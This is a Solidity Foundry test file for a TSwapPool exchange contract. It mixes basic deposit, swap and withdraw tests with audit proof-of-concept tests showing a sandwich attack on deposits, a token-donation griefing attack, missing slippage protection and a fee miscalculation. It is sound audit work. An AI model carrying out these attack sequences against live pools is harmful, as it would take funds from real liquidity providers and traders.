// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { TSwapPool } from "../../src/PoolFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IERC20Errors} from '@openzeppelin/contracts/interfaces/draft-IERC6093.sol';

contract TSwapPoolTest is Test {
    TSwapPool pool;
    ERC20Mock poolToken;
    ERC20Mock weth;

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        poolToken = new ERC20Mock();
        weth = new ERC20Mock();
        pool = new TSwapPool(address(poolToken), address(weth), "LTokenA", "LA");

        weth.mint(liquidityProvider, 200e18);
        poolToken.mint(liquidityProvider, 200e18);

        weth.mint(user, 10e18);
        poolToken.mint(user, 10e18);
    }

    function testDeposit() public {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));

        assertEq(pool.balanceOf(liquidityProvider), 100e18);
        assertEq(weth.balanceOf(liquidityProvider), 100e18);
        assertEq(poolToken.balanceOf(liquidityProvider), 100e18);

        assertEq(weth.balanceOf(address(pool)), 100e18);
        assertEq(poolToken.balanceOf(address(pool)), 100e18);
    }

    function testDepositSwap() public {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        vm.startPrank(user);
        poolToken.approve(address(pool), 10e18);
        // After we swap, there will be ~110 tokenA, and ~91 WETH
        // 100 * 100 = 10,000
        // 110 * ~91 = 10,000
        uint256 expected = 9e18;

        pool.swapExactInput(poolToken, 10e18, weth, expected, uint64(block.timestamp));
        assert(weth.balanceOf(user) >= expected);
    }

    function testWithdraw() public {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));

        pool.approve(address(pool), 100e18);
        pool.withdraw(100e18, 100e18, 100e18, uint64(block.timestamp));

        assertEq(pool.totalSupply(), 0);
        assertEq(weth.balanceOf(liquidityProvider), 200e18);
        assertEq(poolToken.balanceOf(liquidityProvider), 200e18);
    }

    function testCollectFees() public {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        vm.startPrank(user);
        uint256 expected = 9e18;
        poolToken.approve(address(pool), 10e18);
        pool.swapExactInput(poolToken, 10e18, weth, expected, uint64(block.timestamp));
        vm.stopPrank();

        vm.startPrank(liquidityProvider);
        pool.approve(address(pool), 100e18);
        pool.withdraw(100e18, 90e18, 100e18, uint64(block.timestamp));
        assertEq(pool.totalSupply(), 0);
        assert(weth.balanceOf(liquidityProvider) + poolToken.balanceOf(liquidityProvider) > 400e18);
    }

    //@audit-poc
    function test_SandwichAttackOnDeposit() external {
        //initial liquidity added to the pool:
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        //user tries to make a deposit of 5e18 WETH
        uint256 wethAmountToDeposit = 5e18;
        uint256 poolTokenToDepositBeforeFrontRun = pool.getPoolTokensToDepositBasedOnWeth(wethAmountToDeposit);

        //attacker tries to front-run the deposit by making a swap trade
        uint256 outputWeth = 7e18;
        uint256 inputReserve_PoolToken = poolToken.balanceOf(address(pool));
        uint256 outputReserve_Weth = weth.balanceOf(address(pool));
        uint256 inputPoolToken =
            pool.getInputAmountBasedOnOutput(outputWeth, inputReserve_PoolToken, outputReserve_Weth);
        // Record attacker's initial balances
        uint256 attackerWethBefore = weth.balanceOf(attacker);
        uint256 attackerPoolTokenBefore = poolToken.balanceOf(attacker);

        poolToken.mint(attacker, inputPoolToken + 1); //just to be sure

        vm.startPrank(attacker);
        poolToken.approve(address(pool), type(uint256).max);
        pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
        vm.stopPrank();

        //user makes a deposit
        uint256 poolTokenToDepositAfterFrontRun = pool.getPoolTokensToDepositBasedOnWeth(wethAmountToDeposit);
        assertGt(poolTokenToDepositAfterFrontRun, poolTokenToDepositBeforeFrontRun, "Front-run failed");

        vm.startPrank(user);
        require(poolToken.balanceOf(user) >= poolTokenToDepositAfterFrontRun, "Not enough pool tokens");
        poolToken.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(wethAmountToDeposit, 0, poolTokenToDepositAfterFrontRun, uint64(block.timestamp));
        vm.stopPrank();

        // BACKRUN: Attacker reverses the trade (WETH → PoolToken)
        vm.startPrank(attacker);
        uint256 wethToSwapBack = outputWeth;
        weth.approve(address(pool), wethToSwapBack);
        pool.swapExactInput(weth, wethToSwapBack, poolToken, 0, uint64(block.timestamp));
        vm.stopPrank();

        // Calculate attacker's profit
        uint256 attackerWethAfter = weth.balanceOf(attacker);
        uint256 attackerPoolTokenAfter = poolToken.balanceOf(attacker);

        // Attacker should have more PoolToken than they started with
        int256 wethProfit = int256(attackerWethAfter) - int256(attackerWethBefore);
        int256 poolTokenProfit = int256(attackerPoolTokenAfter) - int256(attackerPoolTokenBefore);

        console.log("Attacker WETH profit:", wethProfit);
        console.log("Attacker PoolToken profit:", poolTokenProfit);
        console.log("User paid extra PoolToken:", poolTokenToDepositAfterFrontRun - poolTokenToDepositBeforeFrontRun);

        // The attacker should be profitable in at least one token
        assertTrue(poolTokenProfit > 0 || wethProfit > 0, "Attack should be profitable");
    }

    //@audit-poc
    function test_AddLiquidityWithZeroPoolTokens() external {
        //inital Liquidity added to the pool with 100 WETH and 0 PoolTokens
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 0, 0, uint64(block.timestamp));
        vm.stopPrank();

        uint256 wethBalanceInThePool = weth.balanceOf(address(pool));
        uint256 poolTokenBalanceInThePool = poolToken.balanceOf(address(pool));
        uint256 liquidityTokenBalance = pool.balanceOf(liquidityProvider);

        assertEq(wethBalanceInThePool, liquidityTokenBalance);
        assertEq(poolTokenBalanceInThePool, 0);

        //user tries to make a deposit of 1 WETH and 0 pool tokens
        uint256 wethToDeposit = 1e18; // 1 WETH
        vm.startPrank(user);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(wethToDeposit, 0, 0, uint64(block.timestamp));
        vm.stopPrank();

        assertEq(poolTokenBalanceInThePool, 0);
    }

    //@audit-poc
    function test_WithdrawLargePoolTokensWithSmallPoolTokensWithGriefingAttack() external {
        uint256 initialWethAmount = 100e18;
        uint256 initialPoolTokenAmount = 100e18;
        //initial liquidity added to the pool
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), type(uint256).max);
        poolToken.approve(address(pool), type(uint256).max);
        pool.deposit(initialWethAmount, 0, initialPoolTokenAmount, uint64(block.timestamp));
        vm.stopPrank();

        //user adds liquidty with 10e18 WETH
        uint256 wethToDeposit = 10e18;
        uint256 poolTokenToDeposit = pool.getPoolTokensToDepositBasedOnWeth(wethToDeposit);
        console.log("PoolToken to deposit:", poolTokenToDeposit);


        if (poolTokenToDeposit > poolToken.balanceOf(user)) {
            poolToken.mint(user, poolTokenToDeposit - poolToken.balanceOf(user) + 1); //just to be sure
        }

        vm.startPrank(user);
        weth.approve(address(pool), type(uint256).max);
        poolToken.approve(address(pool), type(uint256).max);
        pool.deposit(wethToDeposit, 0, poolTokenToDeposit, uint64(block.timestamp));
        vm.stopPrank();

        assertEq(poolToken.balanceOf(address(pool)), initialPoolTokenAmount + poolTokenToDeposit);
        assertEq(weth.balanceOf(address(pool)), initialWethAmount + wethToDeposit);

        //attacker is donating 1000ETH pool tokens to the pool to skew the results
        //x*y = k invariant doesn't hold anymore
        vm.startPrank(attacker);
        poolToken.mint(attacker, 1000 ether);
        poolToken.transfer(address(pool), 1000 ether);
        vm.stopPrank();

        //LP tokens are minted soley based on the WETH deposited
        uint256 userLPTokenBalance = pool.balanceOf(user);
        assertEq(userLPTokenBalance, wethToDeposit);

        uint256 expectedPoolTokenToWithdraw =
            (userLPTokenBalance * poolToken.balanceOf(address(pool))) / pool.totalLiquidityTokenSupply();

        uint256 expectedWethToWithdraw =
            (userLPTokenBalance * weth.balanceOf(address(pool))) / pool.totalLiquidityTokenSupply();

        //user tries to withdraw all pool tokens
        vm.startPrank(user);
        pool.approve(address(pool), type(uint256).max);
        pool.withdraw(userLPTokenBalance, expectedWethToWithdraw, expectedPoolTokenToWithdraw, uint64(block.timestamp));
        vm.stopPrank();

        assertGt(expectedPoolTokenToWithdraw, poolTokenToDeposit, "Received more pool tokens than expected");
        assertEq(expectedPoolTokenToWithdraw, poolToken.balanceOf(user), "User should have received all pool tokens");
        assertEq(expectedWethToWithdraw, weth.balanceOf(user), "User should have received all WETH");
        assertEq(expectedWethToWithdraw, wethToDeposit);
    }
    //@audit-poc
    function test_SellTokens_Reverts() external { 
        uint256 initialWethAmount = 100e18;
        uint256 initialPoolTokenAmount = 100e18;
        //initial liquidity added to the pool
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), type(uint256).max);
        poolToken.approve(address(pool), type(uint256).max);
        pool.deposit(initialWethAmount, 0, initialPoolTokenAmount, uint64(block.timestamp));
        vm.stopPrank();

        //user wants to sell pool tokens
        uint256 poolTokenToSell = 10e18;
        //weth expected to receive
        uint256 expectedWethToReceive = pool.getOutputAmountBasedOnInput(poolTokenToSell, 
            poolToken.balanceOf(address(pool)), weth.balanceOf(address(pool)));
        console.log("Expected WETH to receive:", expectedWethToReceive);

        vm.startPrank(user);
        poolToken.approve(address(pool), type(uint256).max);
        vm.expectPartialRevert(IERC20Errors.ERC20InsufficientBalance.selector);
        // uint256 wethReceived = pool.sellPoolTokens(poolTokenToSell);
        pool.sellPoolTokens(poolTokenToSell);
        vm.stopPrank();

        // assertEq(wethReceived, expectedWethToReceive, "User should receive the expected WETH");
    }

    //@audit-poc
    function test_UserIsChargedMoreThanIntended() external{
        uint256 initialWethAmount = 100e18;
        uint256 initialPoolTokenAmount = 100e18;
        //initial liquidity added to the pool
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), type(uint256).max);
        poolToken.approve(address(pool), type(uint256).max);
        pool.deposit(initialWethAmount, 0, initialPoolTokenAmount, uint64(block.timestamp));
        vm.stopPrank();

        //user wants to sell WETH tokens 
        uint256 wethToBuy = 1e18;
        //poolTokens expected to receive
        //since the pool ratio is 1:1, the user is expected to spend ~ 1 pool token
        uint256 expectedPoolTokensToAdd = pool.getInputAmountBasedOnOutput(wethToBuy, poolToken.balanceOf(address(pool)), weth.balanceOf(address(pool)));
        console.log("Expected PoolTokens to add:", expectedPoolTokensToAdd);
        uint256 inputReserve = poolToken.balanceOf(address(pool));
        uint256 outputReserve = weth.balanceOf(address(pool));
        uint256 outputAmount = wethToBuy;
 
        uint256 actualPoolTokensToAdd = (1000 * (inputReserve * outputAmount)) / (997 * (outputReserve - outputAmount));
        console.log("Actual PoolTokens to add:", actualPoolTokensToAdd);

        assertLt(actualPoolTokensToAdd, expectedPoolTokensToAdd, "User is charged more than intended");

        //initiate the swap
        address someUser = makeAddr("someUser");
        poolToken.mint(someUser, 11 ether); //minting more than expected to ensure the user has enough balance
        vm.startPrank(someUser);
        poolToken.approve(address(pool), type(uint256).max);
        pool.swapExactOutput(poolToken, weth, wethToBuy, uint64(block.timestamp));
        vm.stopPrank();

        uint256 poolTokensAfterSwap = poolToken.balanceOf(someUser);
        //after swap the user is left with less than 1 pool token (i.e spent nearly 10 times of the intended ~10 pool tokens), when they should have spent nearly 1 pool token for the purchase of 1 WETH
        assertLt(poolTokensAfterSwap, 1e18, "User should have spent less than 1 pool token");

    }
    
    //@audit-poc
    function test_SwapExactInput_Always_Returns_Zero() external {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        vm.startPrank(user);
        poolToken.approve(address(pool), 10e18);
        // After we swap, there will be ~110 tokenA, and ~91 WETH
        // 100 * 100 = 10,000
        // 110 * ~91 = 10,000
        uint256 expected = 9e18;

        uint256 actualAmount = pool.swapExactInput(poolToken, 10e18, weth, expected, uint64(block.timestamp));
        vm.stopPrank();

        assert(weth.balanceOf(user) >= expected);
        assertEq(actualAmount, 0, "SwapExactInput should always return 0");
    }

    //@audit-poc 
    function test_No_Slippage_Protection_In_SwapExactOutput() external {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        uint256 wethToBuy = 1e18;
        //user doesn't want to spend more than 2e18 pool tokens for 1e18 WETH 
        //since the pool ratio is 1:1, the user is expected to spend ~ 1 pool token
        //initiate the swap
        address someUser = makeAddr("someUser");
        poolToken.mint(someUser, 11 ether); //minting more than expected to ensure the user has enough balance
        vm.startPrank(someUser);
        poolToken.approve(address(pool), type(uint256).max);
        pool.swapExactOutput(poolToken, weth, wethToBuy, uint64(block.timestamp));
        vm.stopPrank();

        uint256 poolTokensAfterSwap = poolToken.balanceOf(someUser);
        //after swap the user is left with less than 1 pool token due to price slippage, when they should have spent nearly 1 pool token for the purchase of 1 WETH
        assertLt(poolTokensAfterSwap, 1e18, "User should have spent less than 1 pool token");
    }

} 
